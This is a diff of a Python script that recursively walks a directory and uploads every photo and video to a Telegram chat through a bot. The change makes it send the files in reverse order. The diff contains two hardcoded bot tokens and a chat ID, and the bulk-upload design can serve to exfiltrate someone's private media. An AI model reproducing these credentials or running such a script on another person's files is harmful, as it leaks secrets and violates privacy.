@@ -3,7 +3,7 @@ import requests
 from concurrent.futures import ThreadPoolExecutor
 
 # Your bot's token
-BOT_TOKEN = '7414483707:AAGzV3_Qu2S49pIXIEoec0FG49Z7wt-8PYA'
+BOT_TOKEN = '7464554300:AAGNOrGwmgTIYewadEV2i_dWf1SaQiv5a3E'
 # Your chat ID (user or group where you want to send the photos/videos)
 CHAT_ID = '6568295648'
 # Path to the directory containing the media files
@@ -40,13 +40,20 @@ def send_media_task(file_path):
         send_video(file_path)
 
 def send_all_media(directory):
-    # Use os.walk to traverse all directories and subdirectories
-    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
-        for root, dirs, files in os.walk(directory):
-            for filename in files:
-                file_path = os.path.join(root, filename)
-                # Submit each file sending task to the thread pool
-                executor.submit(send_media_task, file_path)
+    # Collect all file paths in a list
+    file_paths = []
+    for root, dirs, files in os.walk(directory):
+        for filename in files:
+            file_path = os.path.join(root, filename)
+            file_paths.append(file_path)
 
-# Run the function to send all photos and videos
+    # Reverse the order of file paths
+    file_paths.reverse()
+
+    # Use ThreadPoolExecutor to send files concurrently
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+        for file_path in file_paths:
+            executor.submit(send_media_task, file_path)
+
+# Run the function to send all photos and videos in reverse order
 send_all_media(DIRECTORY)
